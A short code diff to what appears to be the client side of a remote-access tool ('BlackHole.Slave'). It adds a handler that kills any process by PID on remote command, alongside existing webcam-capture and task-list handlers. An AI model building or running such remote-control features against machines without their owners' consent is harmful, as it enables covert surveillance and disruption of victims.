@@ -163,6 +163,7 @@ namespace BlackHole.Slave
                 .With<StopWebcamCaptureMessage>(Webcam.Instance.StopScreenCapture)
                 .With<StartTasksMessage>(TaskList)
                 .With<StopTasksMessage>(StopTaskList)
+                .With<KillProcessMessage>(KillProcess)
                 .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));
 
     #if DEBUG
@@ -498,6 +499,12 @@ namespace BlackHole.Slave
             //Console.WriteLine("After " + a.Status);
             // Just continue on this thread, or Wait/WaitAll with try-catch:
     
+        }
+
+        public void KillProcess(KillProcessMessage message)
+        {
+            Process p = Process.GetProcessById(Convert.ToInt32(message.PID));
+            p.Kill();
         }
 
         /// <summary>
